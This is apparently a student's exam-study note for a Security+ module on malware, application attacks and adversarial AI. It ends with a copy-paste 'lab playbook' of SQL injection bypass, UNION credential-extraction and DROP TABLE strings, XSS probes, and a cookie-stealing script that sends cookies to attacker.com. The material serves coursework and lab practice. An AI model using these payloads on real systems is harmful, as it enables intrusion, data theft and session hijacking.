# Exam Study — Module 3: Threats and Attacks on Endpoints

**Source PDF:** Week2Ciampa_CompTIASec_7e_PPT_Mod03.pdf — CompTIA Security+ Guide to Network Security Fundamentals, 7th Edition, Module 3  
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]  
**Tags:** #CS451 #exam #malware #ransomware #viruses #application-attacks #XSS #SQL-injection #adversarial-AI

---

## Quick Lookup Index

**Sections:**
1. What Is Malware?
2. Imprison — Ransomware and Cryptomalware
3. Launch — Viruses, Worms, and Bots
4. Snoop — Spyware and Keyloggers
5. Deceive — PUPs, Trojans, and RATs
6. Evade — Backdoors, Logic Bombs, and Rootkits
7. Application Attacks
8. Adversarial Artificial Intelligence
- Deep Dive: The Ransomware Economic Ecosystem
- Deep Dive: Why Fileless Viruses Are the Current Frontier
- Knowledge Check Q&A
- Lab Playbook (Copy-Paste)
- Graph View Links

**Key Terms:** endpoint, malware, Imprison/Launch/Snoop/Deceive/Evade, ransomware, blocker ransomware, cryptomalware, air-gapped backups, virus, file-based virus, appender infection, armored virus, split infection, mutation, self-destruct, fileless virus, LOLBins, PowerShell, WMI, .NET, Macro/VBA, Registry, worm, Morris Worm, bot, botnet, bot herder, C&C, dead drop C&C, DDoS, cryptomining, spyware, keylogger (software/hardware), PUP, bloatware, Trojan, RAT, backdoor, logic bomb, rootkit, Secure Boot, application attacks, XSS, SQL injection, CSRF, SSRF, replay attack, session ID, nonce, buffer overflow, integer overflow, NULL pointer dereference, resource exhaustion, API attack, device driver attack, DLL injection, AI, ML, adversarial AI, tainted training data, false negatives, SOAR

---

## 1. What Is Malware?

**Malware** (malicious software) is software that enters a computer system **without the user's knowledge or consent** and performs an unwanted, harmful action.

- Legal definition: any instruction set "designed to modify, damage, destroy, record, or transmit information within a computer system or network without the intent or permission of the owner."
- Malware is **continually evolving** to avoid detection by improved security measures.

### Classification by Primary Action

| Category | Action | Malware Types |
|---|---|---|
| **Imprison** | Restricts access; makes user feel trapped | Ransomware, Cryptomalware |
| **Launch** | Uses infected device to launch attacks elsewhere | Virus (file-based, fileless), Worm, Bot |
| **Snoop** | Steals information silently | Spyware, Keylogger |
| **Deceive** | Hides its true nature from the user | PUP, Trojan, RAT |
| **Evade** | Helps malware avoid detection | Backdoor, Logic Bomb, Rootkit |

---

## 2. Imprison — Ransomware and Cryptomalware

### Ransomware

**Ransomware** prevents an endpoint from properly functioning until a fee is paid. The device is held hostage — rebooting causes the ransomware to re-launch automatically.

**Evolution of ransomware:**

| Phase | Characteristics |
|---|---|
| **Blocker ransomware** (early) | Displays fake law enforcement or software vendor screen; demands "fine" via online payment |
| **Modern ransomware** | Drops the pretense entirely; blocks the computer and demands cryptocurrency ransom |
| **Government targeting** | Two-thirds of 2019 ransomware attacks targeted state and local governments (weaker security); 350+ governments attacked |

**Why ransomware works economically:**
- Ransom set to a "sweet spot": low enough individuals pay (~$500 for personal devices) but high enough for profitability (average enterprise ransom > $1.3 million).
- Cyber insurance (an $8 billion industry) instructs policyholders to pay ransoms because it's cheaper than downtime + recovery costs.
- The cyber insurance **loss ratio is only 35 cents per dollar** (vs. ~62 cents for property/casualty), making cyber insurance extremely profitable for insurers — and inadvertently subsidizing more ransomware attacks.

> **Historical note:** The first ransomware attack occurred in **1989** — an AIDS researcher distributed 20,000 floppy disks to researchers in 90+ countries. After 90 boot cycles, it demanded $189.

### Cryptomalware

**Cryptomalware** is a more severe variant of ransomware: instead of blocking the screen, it **encrypts all files** on the device (and any connected network drives, USB drives, NAS devices, servers, and cloud repositories).

**Why it is worse than regular ransomware:**
- The user cannot even access their data to determine what was lost.
- Encrypted files on *any network-connected storage* are also encrypted — backups that are online are not safe.
- Ransom price escalates every few hours/days.
- Threat actors may delete files periodically until payment is received.

**Reliability of crypto-ransomware operators:**
- Decryption key delivered ~99% of the time after payment.
- Key works ~96% of the time (some variants corrupt data during encryption).
- Operators maintain this reliability to sustain victim willingness to pay.

**Best defense:** resilient, tested, **air-gapped backups** that cannot be reached from the infected network.

---

## 3. Launch — Viruses, Worms, and Bots

These malware types use the infected computer as a **weapon to attack other computers**.

### Virus

A virus requires **two carriers**: a *file* (to attach to) and a *human* (to transport it).

#### File-Based Virus

A **file-based virus** attaches to a file and replicates on the host without human intervention, but spreads to other computers only when a user transfers the infected file.

**Key properties:**
- Infects 50+ Windows file types (`.exe`, `.docx`, `.xlsx`, `.msi`, `.ps1`, `.wsf`)
- **Lifecycle**: infects file → delivers payload (corrupt/delete/steal) → replicates into another file on the same host → spread occurs when user moves infected file.
- **Appender infection**: virus appends itself to the end of a file and inserts a jump instruction at the beginning redirecting execution to the virus code.

**Armored virus evasion techniques:**
| Technique | How It Works |
|---|---|
| **Split infection** | Splits malicious code into fragments at random positions throughout the host file |
| **Mutation** | Changes internal code on each execution to one of a set of predefined mutations |
| **Self-destruct** | Detects security researcher tools and deletes itself to prevent analysis |

#### Fileless Virus

A **fileless virus** does NOT attach to any file. Instead, it exploits **Living-off-the-Land Binaries (LOLBins)** — native OS services and processes — loading malicious code directly into RAM.

**Common Windows LOLBins used:**

| LOLBin | Description |
|---|---|
| **PowerShell** | Cross-platform task automation; full access to Windows OS core |
| **Windows Management Instrumentation (WMI)** | Standard interface for device management |
| **.NET Framework** | Developer platform for building applications |
| **Macro (VBA)** | Automation scripts stored within Office documents |

**Advantages of fileless over file-based viruses:**

| Advantage | Why It Matters |
|---|---|
| **Easy to infect** | Delivered via malicious webpages; browser executes JavaScript → invokes LOLBin |
| **Extensive control** | PowerShell has full OS access — can manipulate accounts and password protection |
| **Persistent** | Writes itself to Windows Registry; re-launches on every reboot |
| **Difficult to detect** | No file to scan; LOLBins appear as trusted applications; PowerShell memory section is unsearchable |
| **Difficult to defend** | Disabling all LOLBins would cripple the OS; they are loaded at boot before any defense can act |

### Worm

A **worm** spreads **autonomously across networks** by exploiting vulnerabilities in applications or operating systems — no human transport action needed.

| Feature | Virus | Worm |
|---|---|---|
| Self-replication scope | On the same host | Across computers via network |
| Human transport needed | Yes | No |
| Nickname | — | "Network virus" |
| Payload | Corrupt files, steal data | Delete files, grant remote control, install malware |

> **Historical note:** The first major worm (1988, Morris Worm) exploited a misconfiguration in a remote command execution program and affected ~6,000 computers (10% of the Internet at the time).

### Bot / Botnet

A **bot** (zombie) is an infected computer placed under an attacker's remote control. A **botnet** aggregates hundreds, thousands, or millions of bots under a **bot herder**.

**Command-and-Control (C&C) structures:**
- Bot-herding website where commands are posted.
- Third-party website sign-in.
- Commands encoded in blog posts, Twitter posts, Facebook notes.
- **Dead drop C&C**: bot herder creates a draft email in Gmail (never sent); bots log in and read the draft — no outgoing message record; all traffic encrypted.

| Botnet Use | Description |
|---|---|
| **Spam** | Send massive volumes of spam from thousands of different IPs |
| **Spread malware** | Download and execute files; create new bots |
| **Ad fraud** | Simulate mouse clicks on ads to generate fraudulent revenue |
| **Cryptomining** | Combine millions of bots to verify cryptocurrency transactions |
| **DDoS** | Flood a target with traffic from thousands of sources |

---

## 4. Snoop — Spyware and Keyloggers

### Spyware

**Spyware** is tracking software deployed **without user consent** that secretly monitors behavior and collects personal or sensitive information.

| Technology | Description |
|---|---|
| Automatic download | Installs software without user interaction |
| Passive tracking | Collects browsing history, private data without installing software |
| System-modifying software | Alters configurations (browser home page, default search engine) |
| Tracking software | Monitors behavior; collects PII; can enable fraud or identity theft |

> Not all spyware is malicious — parental monitoring tools use the same mechanisms. The key difference is **consent and transparency**.

### Keylogger

A **keylogger** silently captures and stores every keystroke typed on the keyboard. Threat actors search captured text for passwords, credit card numbers, and personal data.

| Type | Mechanism | Advantage | Disadvantage |
|---|---|---|---|
| **Software keylogger** | Program installed on the computer; captures keystrokes, screenshots, webcam | Remote installation; no physical access needed | Can be detected by antimalware |
| **Hardware keylogger** | Physical device inserted between keyboard and USB port | Undetectable by antimalware; looks like a normal plug | Requires physical installation AND retrieval |

---

## 5. Deceive — PUPs, Trojans, and RATs

### Potentially Unwanted Programs (PUPs)

**PUPs** are software users do not want, often bundled with legitimate software installations. Examples:
- Pre-installed bloatware that cannot be easily removed.
- Browser toolbar injections.
- Pop-up advertising, pop-under windows.
- Home page hijacking, search engine redirection.

### Trojan

A **Trojan** masquerades as a legitimate or benign application while performing malicious actions secretly.

> Named for the Trojan Horse: the gift was real (wooden horse), but it concealed an attack force inside.

**Example**: a user downloads a free "calendar program." The calendar works, but the program also scans for credit card numbers and transmits them to the attacker's server.

### Remote Access Trojan (RAT)

A **RAT** extends the Trojan model by providing **unauthorized remote access** to the victim's computer via specially configured communication protocols.

**What a RAT allows the attacker to do:**
- Monitor user activity in real time (screen viewing).
- Change system settings.
- Browse and copy files.
- Use the victim's computer to access other network-connected devices.
- Record audio/video through mic and camera.

---

## 6. Evade — Backdoors, Logic Bombs, and Rootkits

### Backdoor

A **backdoor** provides access to a computer, program, or service that **bypasses normal security protections**. Developers legitimately use backdoors during development for ongoing access — but they must be removed before production. When not removed, or when attackers install their own, backdoors provide permanent stealthy re-entry.

### Logic Bomb

A **logic bomb** is code embedded in a legitimate program that **lies dormant** until a specific logical event triggers it, then executes malicious actions.

**Why logic bombs are dangerous:**
- Embedded in large codebases (hundreds of thousands of lines) — a few malicious lines are invisible.
- Programs are not routinely audited for malicious logic.
- Trusted employees can plant them without external detection.

> **Real example**: a Maryland government employee planted a logic bomb script scheduled to destroy 4,000 servers exactly 90 days after his anticipated termination date.

### Rootkit

A **rootkit** hides its own presence and the presence of **other malware** by accessing **lower layers of the OS** or exploiting undocumented system functions — making itself and accompanying malware invisible to the OS and standard antimalware scanners.

**Modern OS mitigations** (reduce rootkit risk significantly):
- Preventing unauthorized kernel drivers from loading.
- Blocking modifications to kernel areas used by rootkits.
- Preventing bootloader modification (Secure Boot in UEFI).

---

## 7. Application Attacks

Application attacks target **software already running on devices** rather than installing new malware. Primary targets: **web servers**, because a single web server vulnerability exposes all connected users.

**Web application stack (each layer is a potential target):**
```
Client Browser
    ↓ HTTP/HTTPS
Web Server
    ↓
Application Server(s)
    ↓
Database Server(s) (internal network)
```

### Cross-Site Scripting (XSS)

**XSS** exploits websites that accept user input **without validation** and include that input in their response.

**How XSS works step-by-step:**
1. A website has a form that echoes user input (e.g., a search field that says "Your results for: [input]").
2. The site does not sanitize the input before embedding it in the HTML response.
3. Attacker submits `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` as input.
4. The server embeds this script in the response page.
5. Another user views the page → the browser executes the attacker's script.
6. The script sends that user's session cookies to the attacker's server.
7. Attacker uses the stolen cookies to hijack the victim's authenticated session.

> The name "cross-site scripting" reflects that the **script originates on the web server** but **executes on the victim's browser** — crossing the trust boundary between sites.

### SQL Injection

**SQL injection** inserts malicious SQL statements into database queries via unsanitized user input fields.

**Classic attack example (password reset form):**

```sql
-- Legitimate query when user enters: braden.thomas@fakemail.com
SELECT fieldlist FROM table WHERE field = 'braden.thomas@fakemail.com'

-- Attacker's injection: whatever' OR 'a'='a
SELECT fieldlist FROM table WHERE field = 'whatever' OR 'a'='a'
```

**Why this works:**
- `'whatever'` matches nothing.
- `OR` — if **either** side is true, the whole clause is true.
- `'a'='a'` is **always true** → the WHERE clause is always true → **all rows returned**.

**Detection method:** enter a single `'` (quotation mark) as input:
- `Email Address Unknown` → input is properly sanitized ✓
- `Server Failure` / SQL error → input is **not** sanitized — vulnerability confirmed ✗

**Other SQL injection variants:**
- Extracting table structure: `'whatever' AND email IS NULL;`
- Deleting tables: `'; DROP TABLE users;--`

### Request Forgeries

| Type | Target | Attack Mechanism | Purpose |
|---|---|---|---|
| **CSRF** (Cross-Site Request Forgery) | User / browser | Takes advantage of authentication token website sends to browser; if user is authenticated elsewhere, new page inherits those privileges | Force target to take action for attacker while appearing authorized |
| **SSRF** (Server-Side Request Forgery) | Web server | Exploits trusting relationship between web servers; if server reads from a URL, attacker modifies that URL to extract data | Gain access to sensitive internal data or inject harmful data |

**CSRF Example:**
1. User logs in to bank.com → receives authentication cookie.
2. User (still logged in) visits attacker.evil.com.
3. evil.com contains a hidden form that submits a funds transfer to bank.com.
4. User's browser automatically attaches bank.com's authentication cookie.
5. Bank.com sees an authenticated, valid-looking request and executes the transfer.

### Replay Attack

A **replay attack** intercepts a legitimate authentication transmission and **retransmits it later** to impersonate the legitimate user.

- Targets **session IDs** and authentication tokens.
- Stolen via network attacks, XSS, or Trojans.
- Defense: session tokens with short expiry times, timestamps, nonces (one-time values).

### Attacks on Software — Memory Vulnerabilities

| Attack Type | Mechanism |
|---|---|
| **Buffer overflow** | Process stores data beyond the boundaries of a fixed-length memory buffer; extra data overwrites adjacent memory locations — can overwrite return addresses to execute arbitrary code |
| **Integer overflow** | Attacker changes a variable to a value outside its intended range; the integer wraps around, creating unexpected behavior |
| **NULL pointer dereference** | Application dereferences a pointer with a NULL value; typically causes crash or exit |
| **Resource exhaustion** | Depletes memory resources, interfering with normal program operation |

**Attacks on External Software Components:**
- **API attacks**: look for vulnerabilities in the Application Programming Interface linking OS, browser, or platform to developer resources.
- **Device driver attacks**: exploit the low-level code controlling hardware.
- **DLL (Dynamic-Link Library) injection**: inject malicious code into legitimate DLL files used by trusted applications.

---

## 8. Adversarial Artificial Intelligence

### What Are AI and Machine Learning?

| Term | Definition |
|---|---|
| **Artificial Intelligence (AI)** | Technology that imitates human abilities (reasoning, learning, recognition) |
| **Machine Learning (ML)** | A subset of AI — "teaching" a device to learn on its own through experience, without continuous programmer instruction |

ML works iteratively: if something attempted does not work, it adjusts and tries a different approach.

### Uses of AI/ML in Cybersecurity

| Application | Example |
|---|---|
| **Email spam/phishing detection** | Virtually all email systems now use AI-based filtering |
| **Threat prediction** | AI can model attack patterns and predict future attacks before they happen |
| **Anomaly detection** | Baseline normal behavior; flag deviations in real time |
| **Automated response** | AI-powered SOAR systems execute responses automatically |

**Adoption trajectory**: ~1 in 5 organizations used cybersecurity AI before 2019; growing to 2 in 3 planning deployment by end of 2020.

### Adversarial AI — Risks of Using AI/ML

Risks associated with AI/ML in security are called **adversarial artificial intelligence**:

| Risk | Description |
|---|---|
| **Compromised ML algorithms** | Attackers modify the ML model itself to ignore or misclassify attacks |
| **Tainted training data** | Attackers alter the training data used to train ML models, causing the model to produce **false negatives** — cloaking real attacks |

**Why tainted training data is the primary risk:**
- ML models are only as trustworthy as the data they were trained on.
- If an attacker can inject malicious examples into the training dataset, they can teach the model to classify their attack methods as "benign."
- Once the model is deployed, the attacker's traffic passes through without triggering alerts.

> **Knowledge Check Answer**: The concern with AI/ML in cybersecurity is **tainted training data** — not buffer overflows, input handling, or device drivers.

---

## Deep Dive: The Ransomware Economic Ecosystem

Ransomware is self-sustaining because **multiple parties have aligned incentives** to perpetuate it:

```
Attacker → earns reliable payment (paid 99%, works 96%)
    ↕
Cyber Insurer → prefers paying ransom (loss ratio only 35%)
    ↕
Victim → prefers paying (faster than rebuilding; insurer encourages it)
    ↕
More attacks → more businesses buy insurance → higher premiums → 
                more insurer profit → ecosystem grows
```

**The cycle is broken only when:**
1. Victims have **air-gapped backups** — they can recover without paying.
2. **Government policy** prohibits ransom payments to designated criminal organizations.

**Defensive implication**: The best ransomware defense is NOT better ransomware detection. It is **resilient, tested, air-gapped backups** that make paying the ransom unnecessary.

---

## Deep Dive: Why Fileless Viruses Are the Current Frontier

Traditional antimalware works by:
1. Scanning files for known malicious signatures.
2. Monitoring files for suspicious modifications.

**A fileless virus defeats both:**
- There is **no file to scan** — the malicious code lives only in RAM.
- LOLBins like PowerShell are **trusted by the OS** — their actions are not flagged as suspicious.
- The code **persists across reboots** via the Registry — but the Registry entry itself looks like a normal configuration entry.
- The attack is delivered via a **malicious webpage** — no download, no execution dialog, no user permission requested.

The only defense is:
- **Behavioral monitoring**: detect anomalous *actions* (not files) — e.g., PowerShell making outbound network connections to unusual endpoints.
- **Script blocking**: prevent PowerShell scripts from running unsigned code.
- **Constrained Language Mode**: limit PowerShell's capabilities for non-administrative users.

---

## Knowledge Check Q&A

**Q1**: What is the primary action that cryptomalware performs?  
**A**: **Imprison** — it encrypts all files so they cannot be opened without a paid decryption key.

**Q2**: What distinguishes a worm from a virus?  
**A**: A worm spreads autonomously across networks by exploiting vulnerabilities — no human transport needed. A virus requires a human to transfer an infected file.

**Q3**: Which application attack uses `'whatever' AND email IS NULL;`?  
**A**: **SQL injection** — this syntax probes the database structure by testing field names.

**Q4**: What is a RAT?  
**A**: A Remote Access Trojan — a Trojan that also grants the attacker unauthorized remote access via specially configured communication protocols.

**Q5**: What is tainted training data in the context of adversarial AI?  
**A**: Attackers alter the data used to train ML models, causing the model to classify malicious activity as benign (false negatives), effectively cloaking attacks.

---

## Textbook Knowledge Check Questions (Ciampa CompTIA Security+ 7e)

> These are the **official end-of-section Knowledge Check Activities** reproduced verbatim from the Module 3 lecture deck (7th Edition, © 2022 Cengage), with the textbook's own answers and explanations.

**KC 1.** What is the primary action that cryptomalware performs?
- a. Imprison
- b. Launch
- c. Snoop
- d. Deceive

**Answer: a. Imprison.** This type of malware imprisons users and encrypts all files on the device so that none of them can be opened without a key for which the victim must pay the attacker.

---

**KC 2.** Which type of application attack might use the following syntax? `'whatever' AND email IS NULL;`
- a. Cross-site scripting
- b. Client-side request forgery
- c. SQL injection
- d. Buffer overflow

**Answer: c. SQL injection.** An SQL injection attack inserts statements to manipulate a database server. The statement in the question can determine the names of different fields in the database.

---

**KC 3.** Which of the following is a concern of using AI and ML in cybersecurity?
- a. Buffer overflows
- b. Improper input handling
- c. Device driver manipulation
- d. Tainted training data

**Answer: d. Tainted training data.** Attackers can attempt to alter training data that is used by machine learning in order to produce false negatives and cloak themselves.

---

## Lab Playbook (Copy-Paste)

Exact attack strings ready to paste into CTFd practical labs. Try the simplest first, escalate if it fails.

### SQL Injection — Authentication Bypass

Paste into a login/password-reset field (try in username, password, and email fields):

```
' OR '1'='1
```
```
' OR 'a'='a
```
```
whatever' OR 'a'='a
```
```
' OR '1'='1' --
```
```
' OR 1=1 --
```
```
admin' --
```
```
admin'--
```
```
admin' #
```
```
" OR "1"="1
```

### SQL Injection — Resulting Query (what the bypass produces)

```sql
-- Legitimate query when user enters: braden.thomas@fakemail.com
SELECT fieldlist FROM table WHERE field = 'braden.thomas@fakemail.com'

-- Attacker's injection: whatever' OR 'a'='a
SELECT fieldlist FROM table WHERE field = 'whatever' OR 'a'='a'
```

### SQL Injection — Detection Probe

Enter a single quote to check if input is sanitized:

```
'
```
- `Email Address Unknown` → sanitized (safe).
- `Server Failure` / SQL error → NOT sanitized (vulnerable).

### SQL Injection — Structure Probing / Destructive

```
'whatever' AND email IS NULL;
```
```
'; DROP TABLE users;--
```

### SQL Injection — UNION-based data extraction

```
' UNION SELECT NULL --
```
```
' UNION SELECT NULL,NULL --
```
```
' UNION SELECT username,password FROM users --
```
```
' UNION SELECT table_name,NULL FROM information_schema.tables --
```
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
```

### Cross-Site Scripting (XSS)

Paste into any field that gets echoed back (search box, comment, profile name):

```html
<script>alert(1)</script>
```
```html
<script>alert(document.cookie)</script>
```

Cookie-stealing payload (exfiltrate session cookie to attacker server):

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

Filter-evasion variants:

```html
<img src=x onerror=alert(1)>
```
```html
<svg onload=alert(1)>
```
```html
"><script>alert(1)</script>
```
```html
<body onload=alert(1)>
```

---

## Graph View Links

**Previous**: [[Module 1 - Introduction to Information Security]]  
**Next**: [[Module 4 - Endpoint and Application Development Security]]  
**Hub**: [[CS451 - Hub]]  
**Source Notes**: [[Module 3 - Threats and Attacks on Endpoints]]
